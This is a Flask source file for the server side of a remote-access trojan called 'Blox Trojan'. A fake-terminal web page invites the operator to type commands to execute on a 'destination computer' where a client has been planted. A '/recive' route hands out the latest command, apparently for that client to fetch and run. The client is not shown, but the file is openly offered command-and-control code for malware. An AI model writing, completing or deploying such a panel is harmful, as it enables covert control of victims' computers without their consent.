#MtwZSalSJa8PHELX9G
#4vJDBwm7PQjWicRyqgaxc9hVs7MWAFhhOEqR

from flask import Flask, request, render_template

x = []

app = Flask(__name__)

@app.route('/')
def my_form():
    return ("""<style>hbody {
    background-color: #272727;
    padding: 10px;
  }
  
  .fakeButtons {
    height: 10px;
    width: 10px;
    border-radius: 50%;
    border: 1px solid #000;
    position: relative;
    top: 6px;
    left: 6px;
    background-color: #ff3b47;
    border-color: #9d252b;
    display: inline-block;
  }
  
  .fakeMinimize {
    left: 11px;
    background-color: #ffc100;
    border-color: #9d802c;
  }
  
  .fakeZoom {
    left: 16px;
    background-color: #00d742;
    border-color: #049931;
  }
  
  .fakeMenu {
    width: 550px;
    box-sizing: border-box;
    height: 25px;
    background-color: #bbb;
    margin: 0 auto;
    border-top-right-radius: 5px;
    border-top-left-radius: 5px;
  }
  
  .fakeScreen {
    background-color: #151515;
    box-sizing: border-box;
    width: 550px;
    margin: 0 auto;
    padding: 20px;
    border-bottom-left-radius: 5px;
    border-bottom-right-radius: 5px;
  }
  
  p {
    position: relative;
    left: 50%;
    margin-left: -8.5em;
    text-align: left;
    font-size: 1.25em;
    font-family: monospace;
    white-space: normal;
    overflow: hidden;
    width: 0;
  }
  
  span {
    color: #fff;
    font-weight: bold;
  }
  
  .line1 {
    color: #9CD9F0;
    -webkit-animation: type .5s 1s steps(20, end) forwards;
    -moz-animation: type .5s 1s steps(20, end) forwards;
    -o-animation: type .5s 1s steps(20, end) forwards;
    animation: type .5s 1s steps(20, end) forwards;
  }
  
  .cursor1 {
    -webkit-animation: blink 1s 2s 2 forwards;
    -moz-animation: blink 1s 2s 2 forwards;
    -o-animation: blink 1s 2s 2 forwards;
    animation: blink 1s 2s 2 forwards;
  }
  
  .line2 {
    color: #CDEE69;
    -webkit-animation: type .5s 4.25s steps(20, end) forwards;
    -moz-animation: type .5s 4.25s steps(20, end) forwards;
    -o-animation: type .5s 4.25s steps(20, end) forwards;
    animation: type .5s 4.25s steps(20, end) forwards;
  }
  
  .cursor2 {
    -webkit-animation: blink 1s 5.25s 2 forwards;
    -moz-animation: blink 1s 5.25s 2 forwards;
    -o-animation: blink 1s 5.25s 2 forwards;
    animation: blink 1s 5.25s 2 forwards;
  }
  
  .line3 {
    color: #E09690;
    -webkit-animation: type .5s 7.5s steps(20, end) forwards;
    -moz-animation: type .5s 7.5s steps(20, end) forwards;
    -o-animation: type .5s 7.5s steps(20, end) forwards;
    animation: type .5s 7.5s steps(20, end) forwards;
  }
  
  .cursor3 {
    -webkit-animation: blink 1s 8.5s 2 forwards;
    -moz-animation: blink 1s 8.5s 2 forwards;
    -o-animation: blink 1s 8.5s 2 forwards;
    animation: blink 1s 8.5s 2 forwards;
  }
  
  .line4 {
    color: #fff;
    -webkit-animation: type .5s 10.75s steps(20, end) forwards;
    -moz-animation: type .5s 10.75s steps(20, end) forwards;
    -o-animation: type .5s 10.75s steps(20, end) forwards;
    animation: type .5s 10.75s steps(20, end) forwards;
  }
  
  .cursor4 {
    -webkit-animation: blink 1s 11.5s infinite;
    -moz-animation: blink 1s 8.5s infinite;
    -o-animation: blink 1s 8.5s infinite;
    animation: blink 1s 8.5s infinite;
    backgrond: transparect
  }
  
  
  .login-box {
    -webkit-animation: blink 1s 11.5s infinite;
    -moz-animation: blink 1s 8.5s infinite;
    -o-animation: blink 1s 8.5s infinite;
    animation: blink 1s 8.5s infinite;
    backgrond: transparect
    position: relative;
    left: 50%;
    margin-left: -8.5em;
    text-align: left;
    font-size: 1.25em;
    font-family: monospace;
    white-space: normal;
    overflow: hidden;
    width: 0;
    backgrond: transparect
  }
  
  @-webkit-keyframes blink {
    0% {
      opacity: 0;
    }
    40% {
      opacity: 0;
    }
    50% {
      opacity: 1;
    }
    90% {
      opacity: 1;
    }
    100% {
      opacity: 0;
    }
  }
  
  @-moz-keyframes blink {
    0% {
      opacity: 0;
    }
    40% {
      opacity: 0;
    }
    50% {
      opacity: 1;
    }
    90% {
      opacity: 1;
    }
    100% {
      opacity: 0;
    }
  }
  
  @-o-keyframes blink {
    0% {
      opacity: 0;
    }
    40% {
      opacity: 0;
    }
    50% {
      opacity: 1;
    }
    90% {
      opacity: 1;
    }
    100% {
      opacity: 0;
    }
  }
  
  @keyframes blink {
    0% {
      opacity: 0;
    }
    40% {
      opacity: 0;
    }
    50% {
      opacity: 1;
    }
    90% {
      opacity: 1;
    }
    100% {
      opacity: 0;
    }
  }
  
  @-webkit-keyframes type {
    to {
      width: 17em;
    }
  }
  
  @-moz-keyframes type {
    to {
      width: 17em;
    }
  }
  
  @-o-keyframes type {
    to {
      width: 17em;
    }
  }
  
  @keyframes type {
    to {
      width: 17em;
    }
  }
  .button {
  display: inline-block;
  -webkit-box-sizing: border-box;
  -moz-box-sizing: border-box;
  box-sizing: border-box;
  width: 150px;
  height: 42px;
  cursor: pointer;
  top: 0;
  right: 0;
  bottom: 0;
  left: 0;
  padding: 0 20px;
  overflow: hidden;
  border: none;
  -webkit-border-radius: 21px;
  border-radius: 21px;
  font: normal 20px/normal "Antic", Helvetica, sans-serif;
  color: rgba(140,140,140,1);
  text-decoration: normal;
  -o-text-overflow: ellipsis;
  text-overflow: ellipsis;
  backgrond: transparect
  -webkit-transition: all 502ms cubic-bezier(0.68, -0.75, 0.265, 1.75);
  -moz-transition: all 502ms cubic-bezier(0.68, -0.75, 0.265, 1.75);
  -o-transition: all 502ms cubic-bezier(0.68, -0.75, 0.265, 1.75);
  transition: all 502ms cubic-bezier(0.68, -0.75, 0.265, 1.75);
    -webkit-animation: blink 1s 11.5s infinite;
    -moz-animation: blink 1s 8.5s infinite;
    -o-animation: blink 1s 8.5s infinite;
    animation: blink 1s 8.5s infinite;

}


    </style>
  <div class=fakeMenu>
      <div class="fakeButtons fakeClose"></div>
      <div class="fakeButtons fakeMinimize"></div>
      <div class="fakeButtons fakeZoom"></div>
    </div>
    <div class="fakeScreen">
      <p class="line1">$ Blox Trojan<span class="cursor1">_</span></p>
      <p class="line2">Are yo ready ? Write any command you want to execute on the destination computer.<span class="cursor2">_</span></p>
      <p class="line3">[?] First, run the client version on the destination computer. You can run it in another software format<span class="cursor3">_</span></p>
      <p class="line4">><span class="cursor4">_</span></p>
<spanclass="login-box"><form method="POST">
      <input name="text">
      <input type="submit">
      </form></span>
  
    </div> """)

@app.route('/', methods=['POST'])
def my_form_post():
    text = request.form['text']
    processed_text = text
    x.append(processed_text)
    return my_form()
    
@app.route('/recive')
def natije() :
    return x[len(x)-1]

app.run()
